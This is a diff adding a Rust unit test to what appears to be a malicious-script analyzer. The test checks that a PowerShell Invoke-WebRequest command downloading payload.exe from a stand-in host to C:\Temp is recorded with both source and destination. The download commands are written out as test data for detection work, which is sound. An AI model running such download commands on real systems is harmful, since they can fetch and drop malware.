@@ -8437,6 +8437,25 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn iwr_short_outfile_before_uri_preserves_destination() {
+        let ps = r#"Invoke-WebRequest -Out C:\Temp\short-out.exe -Uri https://iwr-short-out.example/payload.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        let has = report.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://iwr-short-out.example/payload.exe"
+                        && dst.as_deref() == Some("C:\\Temp\\short-out.exe")
+            )
+        });
+        assert!(
+            has,
+            "IWR -Out destination before -Uri was not preserved: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn iwr_header_urls_are_not_promoted_to_downloads() {
         let ps = r#"Invoke-WebRequest -Headers @{Referer="https://ps-decoy.example/landing"} -Uri https://ps-actual.example/payload.exe -OutFile payload.exe"#;
         let script = format!("powershell -Command \"{}\"\r\n", ps);
